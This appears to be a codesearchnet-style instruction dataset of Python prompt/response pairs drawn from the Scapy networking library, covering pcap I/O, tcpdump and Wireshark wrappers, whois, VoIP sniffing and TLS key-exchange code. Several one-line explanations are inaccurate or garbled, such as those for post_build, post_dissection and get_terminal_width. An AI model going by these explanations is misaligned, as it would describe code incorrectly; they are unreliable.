{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncalculating the Fletcher - 16 checkbytes returned as 2 byte binary - string.", "response": "def fletcher16_checkbytes(binbuf, offset):\n    \"\"\"Calculates the Fletcher-16 checkbytes returned as 2 byte binary-string.\n\n       Including the bytes into the buffer (at the position marked by offset) the  # noqa: E501\n       global Fletcher-16 checksum of the buffer will be 0. Thus it is easy to verify  # noqa: E501\n       the integrity of the buffer on the receiver side.\n\n       For details on the algorithm, see RFC 2328 chapter 12.1.7 and RFC 905 Annex B.  # noqa: E501\n    \"\"\"\n\n    # This is based on the GPLed C implementation in Zebra <http://www.zebra.org/>  # noqa: E501\n    if len(binbuf) < offset:\n        raise Exception(\"Packet too short for checkbytes %d\" % len(binbuf))\n\n    binbuf = binbuf[:offset] + b\"\\x00\\x00\" + binbuf[offset + 2:]\n    (c0, c1) = _fletcher16(binbuf)\n\n    x = ((len(binbuf) - offset - 1) * c0 - c1) % 255\n\n    if (x <= 0):\n        x += 255\n\n    y = 510 - c0 - x\n\n    if (y > 255):\n        y -= 255\n    return chb(x) + chb(y)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef randstring(l):\n    return b\"\".join(struct.pack('B', random.randint(0, 255)) for _ in range(l))", "response": "Returns a random string of length l"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the binary XOR of the 2 provided strings s1 and s2.", "response": "def strxor(s1, s2):\n    \"\"\"\n    Returns the binary XOR of the 2 provided strings s1 and s2. s1 and s2\n    must be of same length.\n    \"\"\"\n    return b\"\".join(map(lambda x, y: chb(orb(x) ^ orb(y)), s1, s2))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef do_graph(graph, prog=None, format=None, target=None, type=None, string=None, options=None):  # noqa: E501\n\n    if format is None:\n        if WINDOWS:\n            format = \"png\"  # use common format to make sure a viewer is installed  # noqa: E501\n        else:\n            format = \"svg\"\n    if string:\n        return graph\n    if type is not None:\n        format = type\n    if prog is None:\n        prog = conf.prog.dot\n    start_viewer = False\n    if target is None:\n        if WINDOWS:\n            target = get_temp_file(autoext=\".\" + format)\n            start_viewer = True\n        else:\n            with ContextManagerSubprocess(\"do_graph()\", conf.prog.display):\n                target = subprocess.Popen([conf.prog.display],\n                                          stdin=subprocess.PIPE).stdin\n    if format is not None:\n        format = \"-T%s\" % format\n    if isinstance(target, str):\n        if target.startswith('|'):\n            target = subprocess.Popen(target[1:].lstrip(), shell=True,\n                                      stdin=subprocess.PIPE).stdin\n        elif target.startswith('>'):\n            target = open(target[1:].lstrip(), \"wb\")\n        else:\n            target = open(os.path.abspath(target), \"wb\")\n    proc = subprocess.Popen(\"\\\"%s\\\" %s %s\" % (prog, options or \"\", format or \"\"),  # noqa: E501\n                            shell=True, stdin=subprocess.PIPE, stdout=target)\n    proc.stdin.write(bytes_encode(graph))\n    proc.stdin.close()\n    proc.wait()\n    try:\n        target.close()\n    except Exception:\n        pass\n    if start_viewer:\n        # Workaround for file not found error: We wait until tempfile is written.  # noqa: E501\n        waiting_start = time.time()\n        while not os.path.exists(target.name):\n            time.sleep(0.1)\n            if time.time() - waiting_start > 3:\n                warning(\"Temporary file '%s' could not be written. Graphic will not be displayed.\", tempfile)  # noqa: E501\n                break\n        else:\n            if conf.prog.display == conf.prog._default:\n                os.startfile(target.name)\n            else:\n                with ContextManagerSubprocess(\"do_graph()\", conf.prog.display):\n                    subprocess.Popen([conf.prog.display, target.name])", "response": "This function will run a GraphViz program and return the graph as a string."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\npickling a Python object to a gzipped file.", "response": "def save_object(fname, obj):\n    \"\"\"Pickle a Python object\"\"\"\n\n    fd = gzip.open(fname, \"wb\")\n    six.moves.cPickle.dump(obj, fd)\n    fd.close()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncorrupt a given percentage or number of bytes from a string", "response": "def corrupt_bytes(s, p=0.01, n=None):\n    \"\"\"Corrupt a given percentage or number of bytes from a string\"\"\"\n    s = array.array(\"B\", bytes_encode(s))\n    s_len = len(s)\n    if n is None:\n        n = max(1, int(s_len * p))\n    for i in random.sample(range(s_len), n):\n        s[i] = (s[i] + random.randint(1, 255)) % 256\n    return s.tostring() if six.PY2 else s.tobytes()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef wrpcap(filename, pkt, *args, **kargs):\n    with PcapWriter(filename, *args, **kargs) as fdesc:\n        fdesc.write(pkt)", "response": "Write a list of packets to a pcap file"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef rdpcap(filename, count=-1):\n    with PcapReader(filename) as fdesc:\n        return fdesc.read_all(count=count)", "response": "Read a pcap or pcapng file and return a list of packets"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef import_hexcap():\n    re_extract_hexcap = re.compile(r\"^((0x)?[0-9a-fA-F]{2,}[ :\\t]{,3}|) *(([0-9a-fA-F]{2} {,2}){,16})\")  # noqa: E501\n    p = \"\"\n    try:\n        while True:\n            line = input().strip()\n            if not line:\n                break\n            try:\n                p += re_extract_hexcap.match(line).groups()[2]\n            except Exception:\n                warning(\"Parsing error during hexcap\")\n                continue\n    except EOFError:\n        pass\n\n    p = p.replace(\" \", \"\")\n    return hex_bytes(p)", "response": "Imports a tcpdump like hexadecimal view of a node s network."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nrun Wireshark on a list of packets.", "response": "def wireshark(pktlist, wait=False, **kwargs):\n    \"\"\"\n    Runs Wireshark on a list of packets.\n\n    See :func:`tcpdump` for more parameter description.\n\n    Note: this defaults to wait=False, to run Wireshark in the background.\n    \"\"\"\n    return tcpdump(pktlist, prog=conf.prog.wireshark, wait=wait, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef tdecode(pktlist, args=None, **kwargs):\n    if args is None:\n        args = [\"-V\"]\n    return tcpdump(pktlist, prog=conf.prog.tshark, args=args, **kwargs)", "response": "Run tshark on a list of packets."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef tcpdump(pktlist, dump=False, getfd=False, args=None,\n            prog=None, getproc=False, quiet=False, use_tempfile=None,\n            read_stdin_opts=None, linktype=None, wait=True):\n    \"\"\"Run tcpdump or tshark on a list of packets.\n\n    When using ``tcpdump`` on OSX (``prog == conf.prog.tcpdump``), this uses a\n    temporary file to store the packets. This works around a bug in Apple's\n    version of ``tcpdump``: http://apple.stackexchange.com/questions/152682/\n\n    Otherwise, the packets are passed in stdin.\n\n    This function can be explicitly enabled or disabled with the\n    ``use_tempfile`` parameter.\n\n    When using ``wireshark``, it will be called with ``-ki -`` to start\n    immediately capturing packets from stdin.\n\n    Otherwise, the command will be run with ``-r -`` (which is correct for\n    ``tcpdump`` and ``tshark``).\n\n    This can be overridden with ``read_stdin_opts``. This has no effect when\n    ``use_tempfile=True``, or otherwise reading packets from a regular file.\n\npktlist: a Packet instance, a PacketList instance or a list of Packet\n         instances. Can also be a filename (as a string), an open\n         file-like object that must be a file format readable by\n         tshark (Pcap, PcapNg, etc.) or None (to sniff)\n\ndump:    when set to True, returns a string instead of displaying it.\ngetfd:   when set to True, returns a file-like object to read data\n         from tcpdump or tshark from.\ngetproc: when set to True, the subprocess.Popen object is returned\nargs:    arguments (as a list) to pass to tshark (example for tshark:\n         args=[\"-T\", \"json\"]).\nprog:    program to use (defaults to tcpdump, will work with tshark)\nquiet:   when set to True, the process stderr is discarded\nuse_tempfile: When set to True, always use a temporary file to store packets.\n              When set to False, pipe packets through stdin.\n              When set to None (default), only use a temporary file with\n              ``tcpdump`` on OSX.\nread_stdin_opts: When set, a list of arguments needed to capture from stdin.\n                 Otherwise, attempts to guess.\nlinktype: If a Packet (or list) is passed in the ``pktlist`` argument,\n          set the ``linktype`` parameter on ``wrpcap``. If ``pktlist`` is a\n          path to a pcap file, then this option will have no effect.\nwait: If True (default), waits for the process to terminate before returning\n      to Scapy. If False, the process will be detached to the background. If\n      dump, getproc or getfd is True, these have the same effect as\n      ``wait=False``.\n\nExamples:\n\n>>> tcpdump([IP()/TCP(), IP()/UDP()])\nreading from file -, link-type RAW (Raw IP)\n16:46:00.474515 IP 127.0.0.1.20 > 127.0.0.1.80: Flags [S], seq 0, win 8192, length 0  # noqa: E501\n16:46:00.475019 IP 127.0.0.1.53 > 127.0.0.1.53: [|domain]\n\n>>> tcpdump([IP()/TCP(), IP()/UDP()], prog=conf.prog.tshark)\n  1   0.000000    127.0.0.1 -> 127.0.0.1    TCP 40 20->80 [SYN] Seq=0 Win=8192 Len=0  # noqa: E501\n  2   0.000459    127.0.0.1 -> 127.0.0.1    UDP 28 53->53 Len=0\n\nTo get a JSON representation of a tshark-parsed PacketList(), one can:\n>>> import json, pprint\n>>> json_data = json.load(tcpdump(IP(src=\"217.25.178.5\", dst=\"45.33.32.156\"),\n...                               prog=conf.prog.tshark, args=[\"-T\", \"json\"],\n...                               getfd=True))\n>>> pprint.pprint(json_data)\n[{u'_index': u'packets-2016-12-23',\n  u'_score': None,\n  u'_source': {u'layers': {u'frame': {u'frame.cap_len': u'20',\n                                      u'frame.encap_type': u'7',\n[...]\n                                      u'frame.time_relative': u'0.000000000'},\n                           u'ip': {u'ip.addr': u'45.33.32.156',\n                                   u'ip.checksum': u'0x0000a20d',\n[...]\n                                   u'ip.ttl': u'64',\n                                   u'ip.version': u'4'},\n                           u'raw': u'Raw packet data'}},\n  u'_type': u'pcap_file'}]\n>>> json_data[0]['_source']['layers']['ip']['ip.ttl']\nu'64'\n    \"\"\"\n    getfd = getfd or getproc\n    if prog is None:\n        prog = [conf.prog.tcpdump]\n        _prog_name = \"windump()\" if WINDOWS else \"tcpdump()\"\n    elif isinstance(prog, six.string_types):\n        _prog_name = \"{}()\".format(prog)\n        prog = [prog]\n    else:\n        raise ValueError(\"prog must be a string\")\n\n    # Build Popen arguments\n    if args is None:\n        args = []\n    else:\n        # Make a copy of args\n        args = list(args)\n\n    stdout = subprocess.PIPE if dump or getfd else None\n    stderr = open(os.devnull) if quiet else None\n\n    if use_tempfile is None:\n        # Apple's tcpdump cannot read from stdin, see:\n        # http://apple.stackexchange.com/questions/152682/\n        use_tempfile = DARWIN and prog[0] == conf.prog.tcpdump\n\n    if read_stdin_opts is None:\n        if prog[0] == conf.prog.wireshark:\n            # Start capturing immediately (-k) from stdin (-i -)\n            read_stdin_opts = [\"-ki\", \"-\"]\n        else:\n            read_stdin_opts = [\"-r\", \"-\"]\n    else:\n        # Make a copy of read_stdin_opts\n        read_stdin_opts = list(read_stdin_opts)\n\n    if pktlist is None:\n        # sniff\n        with ContextManagerSubprocess(_prog_name, prog[0]):\n            proc = subprocess.Popen(\n                prog + args,\n                stdout=stdout,\n                stderr=stderr,\n            )\n    elif isinstance(pktlist, six.string_types):\n        # file\n        with ContextManagerSubprocess(_prog_name, prog[0]):\n            proc = subprocess.Popen(\n                prog + [\"-r\", pktlist] + args,\n                stdout=stdout,\n                stderr=stderr,\n            )\n    elif use_tempfile:\n        tmpfile = get_temp_file(autoext=\".pcap\", fd=True)\n        try:\n            tmpfile.writelines(iter(lambda: pktlist.read(1048576), b\"\"))\n        except AttributeError:\n            wrpcap(tmpfile, pktlist, linktype=linktype)\n        else:\n            tmpfile.close()\n        with ContextManagerSubprocess(_prog_name, prog[0]):\n            proc = subprocess.Popen(\n                prog + [\"-r\", tmpfile.name] + args,\n                stdout=stdout,\n                stderr=stderr,\n            )\n    else:\n        # pass the packet stream\n        with ContextManagerSubprocess(_prog_name, prog[0]):\n            proc = subprocess.Popen(\n                prog + read_stdin_opts + args,\n                stdin=subprocess.PIPE,\n                stdout=stdout,\n                stderr=stderr,\n            )\n        try:\n            proc.stdin.writelines(iter(lambda: pktlist.read(1048576), b\"\"))\n        except AttributeError:\n            wrpcap(proc.stdin, pktlist, linktype=linktype)\n        except UnboundLocalError:\n            raise IOError(\"%s died unexpectedly !\" % prog)\n        else:\n            proc.stdin.close()\n    if dump:\n        return b\"\".join(iter(lambda: proc.stdout.read(1048576), b\"\"))\n    if getproc:\n        return proc\n    if getfd:\n        return proc.stdout\n    if wait:\n        proc.wait()", "response": "Run tcpdump or tshark on a list of packets."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nrun hexedit on a list of packets then return the edited packets.", "response": "def hexedit(pktlist):\n    \"\"\"Run hexedit on a list of packets, then return the edited packets.\"\"\"\n    f = get_temp_file()\n    wrpcap(f, pktlist)\n    with ContextManagerSubprocess(\"hexedit()\", conf.prog.hexedit):\n        subprocess.call([conf.prog.hexedit, f])\n    pktlist = rdpcap(f)\n    os.unlink(f)\n    return pktlist"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_terminal_width():\n    # Let's first try using the official API\n    # (Python 3.3+)\n    if not six.PY2:\n        import shutil\n        sizex = shutil.get_terminal_size(fallback=(0, 0))[0]\n        if sizex != 0:\n            return sizex\n    # Backups / Python 2.7\n    if WINDOWS:\n        from ctypes import windll, create_string_buffer\n        # http://code.activestate.com/recipes/440694-determine-size-of-console-window-on-windows/\n        h = windll.kernel32.GetStdHandle(-12)\n        csbi = create_string_buffer(22)\n        res = windll.kernel32.GetConsoleScreenBufferInfo(h, csbi)\n        if res:\n            (bufx, bufy, curx, cury, wattr,\n             left, top, right, bottom, maxx, maxy) = struct.unpack(\"hhhhHhhhhhh\", csbi.raw)  # noqa: E501\n            sizex = right - left + 1\n            # sizey = bottom - top + 1\n            return sizex\n        return None\n    else:\n        # We have various methods\n        sizex = None\n        # COLUMNS is set on some terminals\n        try:\n            sizex = int(os.environ['COLUMNS'])\n        except Exception:\n            pass\n        if sizex:\n            return sizex\n        # We can query TIOCGWINSZ\n        try:\n            import fcntl\n            import termios\n            s = struct.pack('HHHH', 0, 0, 0, 0)\n            x = fcntl.ioctl(1, termios.TIOCGWINSZ, s)\n            sizex = struct.unpack('HHHH', x)[1]\n        except IOError:\n            pass\n        return sizex", "response": "Get the terminal width of a node."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncores function of the make_table suite, which generates the table", "response": "def __make_table(yfmtfunc, fmtfunc, endline, data, fxyz, sortx=None, sorty=None, seplinefunc=None):  # noqa: E501\n    \"\"\"Core function of the make_table suite, which generates the table\"\"\"\n    vx = {}\n    vy = {}\n    vz = {}\n    vxf = {}\n\n    # Python 2 backward compatibility\n    fxyz = lambda_tuple_converter(fxyz)\n\n    tmp_len = 0\n    for e in data:\n        xx, yy, zz = [str(s) for s in fxyz(*e)]\n        tmp_len = max(len(yy), tmp_len)\n        vx[xx] = max(vx.get(xx, 0), len(xx), len(zz))\n        vy[yy] = None\n        vz[(xx, yy)] = zz\n\n    vxk = list(vx)\n    vyk = list(vy)\n    if sortx:\n        vxk.sort(key=sortx)\n    else:\n        try:\n            vxk.sort(key=int)\n        except Exception:\n            try:\n                vxk.sort(key=atol)\n            except Exception:\n                vxk.sort()\n    if sorty:\n        vyk.sort(key=sorty)\n    else:\n        try:\n            vyk.sort(key=int)\n        except Exception:\n            try:\n                vyk.sort(key=atol)\n            except Exception:\n                vyk.sort()\n\n    if seplinefunc:\n        sepline = seplinefunc(tmp_len, [vx[x] for x in vxk])\n        print(sepline)\n\n    fmt = yfmtfunc(tmp_len)\n    print(fmt % \"\", end=' ')\n    for x in vxk:\n        vxf[x] = fmtfunc(vx[x])\n        print(vxf[x] % x, end=' ')\n    print(endline)\n    if seplinefunc:\n        print(sepline)\n    for y in vyk:\n        print(fmt % y, end=' ')\n        for x in vxk:\n            print(vxf[x] % vz.get((x, y), \"-\"), end=' ')\n        print(endline)\n    if seplinefunc:\n        print(sepline)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef whois(ip_address):\n    whois_ip = str(ip_address)\n    try:\n        query = socket.gethostbyname(whois_ip)\n    except Exception:\n        query = whois_ip\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((\"whois.ripe.net\", 43))\n    s.send(query.encode(\"utf8\") + b\"\\r\\n\")\n    answer = b\"\"\n    while True:\n        d = s.recv(4096)\n        answer += d\n        if not d:\n            break\n    s.close()\n    ignore_tag = b\"remarks:\"\n    # ignore all lines starting with the ignore_tag\n    lines = [line for line in answer.split(b\"\\n\") if not line or (line and not line.startswith(ignore_tag))]  # noqa: E501\n    # remove empty lines at the bottom\n    for i in range(1, len(lines)):\n        if not lines[-i].strip():\n            del lines[-i]\n        else:\n            break\n    return b\"\\n\".join(lines[3:])", "response": "Whois client for Python"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nopens ( if necessary ) filename and read the magic.", "response": "def open(filename):\n        \"\"\"Open (if necessary) filename, and read the magic.\"\"\"\n        if isinstance(filename, six.string_types):\n            try:\n                fdesc = gzip.open(filename, \"rb\")\n                magic = fdesc.read(4)\n            except IOError:\n                fdesc = open(filename, \"rb\")\n                magic = fdesc.read(4)\n        else:\n            fdesc = filename\n            filename = getattr(fdesc, \"name\", \"No name\")\n            magic = fdesc.read(4)\n        return filename, fdesc, magic"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef read_all(self, count=-1):\n        res = []\n        while count != 0:\n            count -= 1\n            p = self.read_packet()\n            if p is None:\n                break\n            res.append(p)\n        return res", "response": "return a list of all packets in the pcap file"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef read_packet(self, size=MTU):\n        while True:\n            try:\n                blocktype, blocklen = struct.unpack(self.endian + \"2I\",\n                                                    self.f.read(8))\n            except struct.error:\n                return None\n            block = self.f.read(blocklen - 12)\n            if blocklen % 4:\n                pad = self.f.read(4 - (blocklen % 4))\n                warning(\"PcapNg: bad blocklen %d (MUST be a multiple of 4. \"\n                        \"Ignored padding %r\" % (blocklen, pad))\n            try:\n                if (blocklen,) != struct.unpack(self.endian + 'I',\n                                                self.f.read(4)):\n                    warning(\"PcapNg: Invalid pcapng block (bad blocklen)\")\n            except struct.error:\n                return None\n            res = self.blocktypes.get(blocktype,\n                                      lambda block, size: None)(block, size)\n            if res is not None:\n                return res", "response": "Read a packet from the file and return the corresponding object."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef read_block_idb(self, block, _):\n        options = block[16:]\n        tsresol = 1000000\n        while len(options) >= 4:\n            code, length = struct.unpack(self.endian + \"HH\", options[:4])\n            # PCAP Next Generation (pcapng) Capture File Format\n            # 4.2. - Interface Description Block\n            # http://xml2rfc.tools.ietf.org/cgi-bin/xml2rfc.cgi?url=https://raw.githubusercontent.com/pcapng/pcapng/master/draft-tuexen-opsawg-pcapng.xml&modeAsFormat=html/ascii&type=ascii#rfc.section.4.2\n            if code == 9 and length == 1 and len(options) >= 5:\n                tsresol = orb(options[4])\n                tsresol = (2 if tsresol & 128 else 10) ** (tsresol & 127)\n            if code == 0:\n                if length != 0:\n                    warning(\"PcapNg: invalid option length %d for end-of-option\" % length)  # noqa: E501\n                break\n            if length % 4:\n                length += (4 - (length % 4))\n            options = options[4 + length:]\n        self.interfaces.append(struct.unpack(self.endian + \"HxxI\", block[:8]) +\n                               (tsresol,))", "response": "Read the IDB block and store it in the internal list."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nread an enhanced packet block.", "response": "def read_block_epb(self, block, size):\n        \"\"\"Enhanced Packet Block\"\"\"\n        intid, tshigh, tslow, caplen, wirelen = struct.unpack(\n            self.endian + \"5I\",\n            block[:20],\n        )\n        return (block[20:20 + caplen][:size],\n                RawPcapNgReader.PacketMetadata(linktype=self.interfaces[intid][0],  # noqa: E501\n                                               tsresol=self.interfaces[intid][2],  # noqa: E501\n                                               tshigh=tshigh,\n                                               tslow=tslow,\n                                               wirelen=wirelen))"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nwrite a Packet or bytes to a pcap file.", "response": "def write(self, pkt):\n        \"\"\"\n        Writes a Packet or bytes to a pcap file.\n\n        :param pkt: Packet(s) to write (one record for each Packet), or raw\n                    bytes to write (as one record).\n        :type pkt: iterable[Packet], Packet or bytes\n        \"\"\"\n        if isinstance(pkt, bytes):\n            if not self.header_present:\n                self._write_header(pkt)\n            self._write_packet(pkt)\n        else:\n            pkt = pkt.__iter__()\n            for p in pkt:\n                if not self.header_present:\n                    self._write_header(p)\n                self._write_packet(p)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nwrite a single packet to the pcap file.", "response": "def _write_packet(self, packet, sec=None, usec=None, caplen=None,\n                      wirelen=None):\n        \"\"\"\n        Writes a single packet to the pcap file.\n\n        :param packet: Packet, or bytes for a single packet\n        :type packet: Packet or bytes\n        :param sec: time the packet was captured, in seconds since epoch. If\n                    not supplied, defaults to now.\n        :type sec: int or long\n        :param usec: If ``nano=True``, then number of nanoseconds after the\n                     second that the packet was captured. If ``nano=False``,\n                     then the number of microseconds after the second the\n                     packet was captured. If ``sec`` is not specified,\n                     this value is ignored.\n        :type usec: int or long\n        :param caplen: The length of the packet in the capture file. If not\n                       specified, uses ``len(raw(packet))``.\n        :type caplen: int\n        :param wirelen: The length of the packet on the wire. If not\n                        specified, tries ``packet.wirelen``, otherwise uses\n                        ``caplen``.\n        :type wirelen: int\n        :returns: None\n        :rtype: None\n        \"\"\"\n        if hasattr(packet, \"time\"):\n            if sec is None:\n                sec = int(packet.time)\n                usec = int(round((packet.time - sec) *\n                                 (1000000000 if self.nano else 1000000)))\n        if usec is None:\n            usec = 0\n\n        rawpkt = raw(packet)\n        caplen = len(rawpkt) if caplen is None else caplen\n\n        if wirelen is None:\n            if hasattr(packet, \"wirelen\"):\n                wirelen = packet.wirelen\n        if wirelen is None:\n            wirelen = caplen\n\n        RawPcapWriter._write_packet(\n            self, rawpkt, sec=sec, usec=usec, caplen=caplen, wirelen=wirelen)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nplay VoIP packets with RAW data that are either sniffed from an IP or from a list of packets.", "response": "def voip_play(s1, lst=None, **kargs):\n    \"\"\"Play VoIP packets with RAW data that\n    are either sniffed either from an IP, or\n    specified as a list.\n\n    It will play only the incoming packets !\n\n    :param s1: The IP of the src of all VoIP packets.\n    :param lst: (optional) A list of packets to load\n    :type s1: string\n    :type lst: list\n\n    :Example:\n\n    >>> voip_play(\"64.2.142.189\")\n    while calling '411@ideasip.com'\n\n    >>> voip_play(\"64.2.142.189\", lst)\n    with list a list of packets with VoIP data\n    in their RAW layer\n\n    .. seealso:: voip_play2\n    to play both the outcoming and incoming packets\n    at the same time.\n\n    .. seealso:: voip_play3\n    to read RTP VoIP packets\n    \"\"\"\n\n    dsp, rd = os.popen2(sox_base % \"\")\n\n    def play(pkt):\n        if not pkt:\n            return\n        if not pkt.haslayer(UDP) or not pkt.haslayer(IP):\n            return\n        ip = pkt.getlayer(IP)\n        if s1 == ip.src:\n            dsp.write(pkt.getlayer(conf.raw_layer).load[12:])\n    try:\n        if lst is None:\n            sniff(store=0, prn=play, **kargs)\n        else:\n            for p in lst:\n                play(p)\n    finally:\n        dsp.close()\n        rd.close()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef phantom_mode(pkt):\n    if not pkt.tls_session:\n        return False\n    if not pkt.tls_session.tls_version:\n        return False\n    return pkt.tls_session.tls_version < 0x0303", "response": "Return True if we are in phantom mode."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef addfield(self, pkt, s, val):\n        v = pkt.tls_session.tls_version\n        if v and v < 0x0300:\n            return s\n        return super(SigLenField, self).addfield(pkt, s, val)", "response": "Add a sig_len field."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating our own sig_val.", "response": "def _update_sig(self, m, key):\n        \"\"\"\n        Sign 'm' with the PrivKey 'key' and update our own 'sig_val'.\n        Note that, even when 'sig_alg' is not None, we use the signature scheme\n        of the PrivKey (neither do we care to compare the both of them).\n        \"\"\"\n        if self.sig_alg is None:\n            if self.tls_session.tls_version >= 0x0300:\n                self.sig_val = key.sign(m, t='pkcs', h='md5-sha1')\n            else:\n                self.sig_val = key.sign(m, t='pkcs', h='md5')\n        else:\n            h, sig = _tls_hash_sig[self.sig_alg].split('+')\n            if sig.endswith('pss'):\n                t = \"pss\"\n            else:\n                t = \"pkcs\"\n            self.sig_val = key.sign(m, t=t, h=h)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _verify_sig(self, m, cert):\n        if self.sig_val:\n            if self.sig_alg:\n                h, sig = _tls_hash_sig[self.sig_alg].split('+')\n                if sig.endswith('pss'):\n                    t = \"pss\"\n                else:\n                    t = \"pkcs\"\n                return cert.verify(m, self.sig_val, t=t, h=h)\n            else:\n                if self.tls_session.tls_version >= 0x0300:\n                    return cert.verify(m, self.sig_val, t='pkcs', h='md5-sha1')\n                else:\n                    return cert.verify(m, self.sig_val, t='pkcs', h='md5')\n        return False", "response": "Verify that the signature of m is valid for the Cert cert."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef register_pubkey(self):\n        p = pkcs_os2ip(self.dh_p)\n        g = pkcs_os2ip(self.dh_g)\n        pn = dh.DHParameterNumbers(p, g)\n\n        y = pkcs_os2ip(self.dh_Ys)\n        public_numbers = dh.DHPublicNumbers(y, pn)\n\n        s = self.tls_session\n        s.server_kx_pubkey = public_numbers.public_key(default_backend())\n\n        if not s.client_kx_ffdh_params:\n            s.client_kx_ffdh_params = pn.parameters(default_backend())", "response": "XXX Check that the pubkey received is in the group."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef fill_missing(self):\n        s = self.tls_session\n\n        if self.curve_type is None:\n            self.curve_type = _tls_ec_curve_types[\"named_curve\"]\n\n        if self.named_curve is None:\n            curve = ec.SECP256R1()\n            s.server_kx_privkey = ec.generate_private_key(curve,\n                                                          default_backend())\n            self.named_curve = next((cid for cid, name in six.iteritems(_tls_named_curves)  # noqa: E501\n                                     if name == curve.name), 0)\n        else:\n            curve_name = _tls_named_curves.get(self.named_curve)\n            if curve_name is None:\n                # this fallback is arguable\n                curve = ec.SECP256R1()\n            else:\n                curve_cls = ec._CURVE_TYPES.get(curve_name)\n                if curve_cls is None:\n                    # this fallback is arguable\n                    curve = ec.SECP256R1()\n                else:\n                    curve = curve_cls()\n            s.server_kx_privkey = ec.generate_private_key(curve,\n                                                          default_backend())\n\n        if self.point is None:\n            pubkey = s.server_kx_privkey.public_key()\n            try:\n                # cryptography >= 2.5\n                self.point = pubkey.public_bytes(\n                    serialization.Encoding.X962,\n                    serialization.PublicFormat.UncompressedPoint\n                )\n            except TypeError:\n                # older versions\n                self.key_exchange = pubkey.public_numbers().encode_point()\n        # else, we assume that the user wrote the server_kx_privkey by himself\n        if self.pointlen is None:\n            self.pointlen = len(self.point)\n\n        if not s.client_kx_ecdh_params:\n            s.client_kx_ecdh_params = curve", "response": "This method is called by the server key exchange module to fill missing values."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nregisters the public key in the server.", "response": "def register_pubkey(self):\n        \"\"\"\n        XXX Support compressed point format.\n        XXX Check that the pubkey received is on the curve.\n        \"\"\"\n        # point_format = 0\n        # if self.point[0] in [b'\\x02', b'\\x03']:\n        #    point_format = 1\n\n        curve_name = _tls_named_curves[self.named_curve]\n        curve = ec._CURVE_TYPES[curve_name]()\n        import_point = ec.EllipticCurvePublicNumbers.from_encoded_point\n        pubnum = import_point(curve, self.point)\n        s = self.tls_session\n        s.server_kx_pubkey = pubnum.public_key(default_backend())\n\n        if not s.client_kx_ecdh_params:\n            s.client_kx_ecdh_params = curve"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef post_dissection(self, m):\n        s = self.tls_session\n\n        # if there are kx params and keys, we assume the crypto library is ok\n        if s.client_kx_ffdh_params:\n            y = pkcs_os2ip(self.dh_Yc)\n            param_numbers = s.client_kx_ffdh_params.parameter_numbers()\n            public_numbers = dh.DHPublicNumbers(y, param_numbers)\n            s.client_kx_pubkey = public_numbers.public_key(default_backend())\n\n        if s.server_kx_privkey and s.client_kx_pubkey:\n            ZZ = s.server_kx_privkey.exchange(s.client_kx_pubkey)\n            s.pre_master_secret = ZZ\n            s.compute_ms_and_derive_keys()", "response": "This method is called when the user has done some additional dissection of the certificate."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef post_build(self, pkt, pay):\n        enc = pkt\n\n        s = self.tls_session\n        s.pre_master_secret = enc\n        s.compute_ms_and_derive_keys()\n\n        if s.server_tmp_rsa_key is not None:\n            enc = s.server_tmp_rsa_key.encrypt(pkt, t=\"pkcs\")\n        elif s.server_certs is not None and len(s.server_certs) > 0:\n            enc = s.server_certs[0].encrypt(pkt, t=\"pkcs\")\n        else:\n            warning(\"No material to encrypt Pre Master Secret\")\n\n        tmp_len = b\"\"\n        if s.tls_version >= 0x0301:\n            tmp_len = struct.pack(\"!H\", len(enc))\n        return tmp_len + enc + pay", "response": "This method is called after the message is sent to the server."}
